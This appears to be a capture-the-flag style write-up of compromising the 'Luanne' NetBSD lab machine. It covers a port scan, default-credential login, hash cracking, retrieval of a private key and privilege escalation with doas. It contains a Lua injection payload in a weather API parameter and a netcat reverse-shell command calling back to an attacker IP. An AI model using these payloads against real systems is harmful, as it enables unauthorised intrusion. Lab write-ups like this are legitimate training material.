#### port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-server-header: Medusa/1.12
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```

#### for port 9001- Enum
search ofr default name/passwd of Medusa get user/123
successfully login this app, get service version 
>  Supervisor 4.2.0

on page - http://10.129.6.86:9001/logtail/processes
```  r.michaels   590  0.0  0.0  35064  1980 ?     Is    1:22PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
```
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://10.129.6.86/weather `

`/forecast             (Status: 200) [Size: 90]`

#### Foothold

For this APi city parameter, try some command
> 10.129.6.86/weather/forecast?city=list
> 10.129.6.86/weather/forecast?city="
> `http://10.129.6.86/weather/forecast?city=list%27)+os.execute(%27id%27)+--`
> ```
> {"code": 500,"error": "unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
> ```
> sent payload of reverseshell
> `http://10.129.5.169/weather/forecast?city=london%27)+os.execute(%22rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff|sh+-i+2%3E%261|nc+10.10.16.47+443+%3E%2Ftmp%2Ff%22)+--`
> ```

Get httpd user shell
`$ cat .htpasswd`
```webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
On kali, crash this hash
`hashcat hash -m 500 /home/edi/tool/rockyou.txt`
```
$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest 
```

use this credential to login port 80, nothing useful

`$ netstat -ant`
```
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        State
tcp        0      0  10.129.6.86.65416      10.10.16.47.443        ESTABLISHED
tcp        0      0  127.0.0.1.3000         127.0.0.1.65417        ESTABLISHED
tcp        0      0  127.0.0.1.65417        127.0.0.1.3000         ESTABLISHED
tcp        0      0  10.129.6.86.80         10.10.16.47.44550      ESTABLISHED
tcp        0      0  10.129.6.86.65421      10.10.16.47.443        CLOSE_WAIT
tcp        0      0  127.0.0.1.3000         127.0.0.1.65422        CLOSE_WAIT
tcp        0      0  127.0.0.1.65422        127.0.0.1.3000         FIN_WAIT_2
tcp        0      0  10.129.6.86.65423      10.10.16.47.8821       CLOSE_WAIT
tcp        0      0  10.129.6.86.65424      10.10.16.47.443        CLOSE_WAIT
tcp        0      0  127.0.0.1.3000         127.0.0.1.65425        CLOSE_WAIT
tcp        0      0  127.0.0.1.65425        127.0.0.1.3000         FIN_WAIT_2
tcp        0      0  10.129.6.86.65426      10.10.16.47.8821       CLOSE_WAIT
tcp        0      0  10.129.6.86.65427      10.10.16.47.443        CLOSE_WAIT
tcp        0      0  127.0.0.1.3000         127.0.0.1.65428        CLOSE_WAIT
tcp        0      0  127.0.0.1.65428        127.0.0.1.3000         FIN_WAIT_2
tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.22                   *.*                    LISTEN
tcp        0      0  *.9001                 *.*                    LISTEN
```
`$ ps -aux`
```
USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
root          0  0.0  0.1      0  6568 ?     OKl   1:26PM 0:00.80 [system]
root          1  0.0  0.0  19848  1588 ?     Is    1:26PM 0:00.01 init 
root        223  0.0  0.0  18804  1880 ?     Ss    1:26PM 0:00.29 dhcpcd: [mast
root        250  0.0  0.0  32532  2292 ?     Ss    1:26PM 0:00.02 /usr/sbin/sys
root        337  0.0  0.0  19708  1312 ?     Is    1:26PM 0:00.00 /usr/sbin/pow
root        434  0.0  0.1 117948  7172 ?     Il    1:26PM 0:05.85 /usr/pkg/bin/
nginx       436  0.0  0.1  33880  3172 ?     I     1:26PM 0:00.00 nginx: worker
root        478  0.0  0.0  71344  2896 ?     Is    1:26PM 0:00.00 /usr/sbin/ssh
_httpd      503  0.0  0.2 118132 11764 ?     Ss    1:26PM 0:01.02 /usr/pkg/bin/
_httpd      523  0.0  0.0  34956  1956 ?     Is    1:26PM 0:00.00 /usr/libexec/
_httpd      528  0.0  0.0  22476  1660 ?     S     1:26PM 0:00.07 /bin/sh /usr/
root        537  0.0  0.0  21840  1656 ?     Is    1:26PM 0:00.01 /usr/sbin/cro
_httpd      540  0.0  0.0  19992  1656 ?     S     1:26PM 0:00.05 /bin/sh /usr/
r.michaels  548  0.0  0.0  34992  1960 ?     Is    1:26PM 0:00.00 /usr/libexec/
```
`$ ps -ax`
 ```
PID TTY   STAT    TIME COMMAND
   0 ?     OKl  0:00.69 [system]
   1 ?     Is   0:00.01 init 
 223 ?     Ss   0:00.30 dhcpcd: [master] [ip4] [ip6] 
 250 ?     Ss   0:00.02 /usr/sbin/syslogd -s 
 337 ?     Is   0:00.00 /usr/sbin/powerd 
 434 ?     Il   0:06.07 /usr/pkg/bin/vmtoolsd 
 436 ?     I    0:00.00 nginx: worker process 
 478 ?     Is   0:00.00 /usr/sbin/sshd 
 503 ?     Ss   0:01.06 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
 523 ?     Is   0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L wea
 528 ?     S    0:00.08 /bin/sh /usr/local/scripts/processes.sh 
 537 ?     Ss   0:00.01 /usr/sbin/cron 
```

httpd of port 3001 running by user r.michaels

`$ curl http://127.0.0.1:3001 -u webapi_user`
```
Enter host password for user 'webapi_user':iamthebest

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0  64333      0 --:--:-- --:--:-- --:--:-- 77200
<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>
```

it is the similar api as port 80, try the vuln happened on there

`curl -s http://127.0.0.1:3001/weather/forecast?city=list`
```
{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
```

`curl  http://127.0.0.1:3001/weather/forecast  --data-urlencode "city=') os.execute('id') --"`
 ```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   104    0    61  100    43  20333  14333 --:--:-- --:--:-- --:--:-- 34666
{"code": 500,"error": "unknown city: ') os.execute('id') --"}$ 
```
seems not vulnerable to command injection

Donot know why try this folder, and "~" at front of user folder!!!
`$ curl http://127.0.0.1:3001/~r.micheals/`
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   217  100   217    0     0  72333      0 --:--:-- --:--:-- --:--:-- 72333
<html><head><title>404 Not Found</title></head>
<body><h1>404 Not Found</h1>
/~r.micheals/: <pre>This item has not been found</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
```
```
curl http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest

<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
	border-top: 1px solid black;
	border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

`curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest `
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   637k      0 --:--:-- --:--:-- --:--:--  849k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```
#### lateral move

`└─$ ssh -i id_rsa r.michaels@10.129.5.169`
```
Welcome to NetBSD!

luanne$ id
uid=1000(r.michaels) gid=100(users) groups=100(users)
```

`92383     20 -rw-------    1 r.michaels        wheel                  9172 Sep 16  2020 /var/mail/r.michaels`
```
From root@localhost.localdomain  Wed Sep 16 07:00:39 2020
Return-Path: <root@localhost.localdomain>
X-Original-To: r.michaels
Delivered-To: r.michaels@localhost.localdomain
Received: by localhost.localdomain (Postfix, from userid 0)
        id DC712168CC; Wed, 16 Sep 2020 07:00:36 +0000 (UTC)
X-vi-recover-file: a.lua
X-vi-recover-path: /var/tmp/vi.recover/vi.YNKFYE
Reply-To: root@localhost.localdomain
From: root@localhost.localdomain (Nvi recovery program)
To: r.michaels@localhost.localdomain
Subject: Nvi saved the file a.lua
Precedence: bulk
Message-Id: <20200916070038.DC712168CC@localhost.localdomain>
Date: Wed, 16 Sep 2020 07:00:36 +0000 (UTC)

On Tue Sep 15 09:46:10 2020, the user r.michaels was editing
a file named a.lua on the machine localhost, when it was
saved for recovery. You can recover most, if not all, of the
changes to this file using the -r option to vi:

        vi -r a.lua
```
no use for ES

check backups folder uder r.michaels home, get a .enc file, which maight be encrypted by pgp, on this OS, use netpgp

`netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc > t.tat.gz  `       
```
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
```
```
luanne$ gunzip t.tar.gz                                                                                

luanne$ tar -zxvf t.tar                                                                                
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
luanne$ ls -la
total 44
drwxrwxrwt   3 root        wheel     96 Dec 30 15:32 .
drwxr-xr-x  21 root        wheel    512 Sep 16  2020 ..
drwxr-x---   4 r.michaels  wheel     96 Sep 16  2020 devel-2020-09-16
-rw-r--r--   1 r.michaels  wheel  12288 Dec 30 15:30 t.tar
```

luanne$ cat www/.htpasswd                                                                              
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.

it is a diff credential

hashcat hash -m 500 /home/edi/tool/rockyou.txt
$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear  

try as root passwd, in NetBSD, doas means sudo

luanne$ doas su
Password:
sh: Cannot determine current working directory
#id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)

#### lesson learned
- default user is alwasy a try for us
- check details of apps when Enum
- curl with some parameter -v ,-X -s etc.
- NetBSD doas
- pgp encrypt
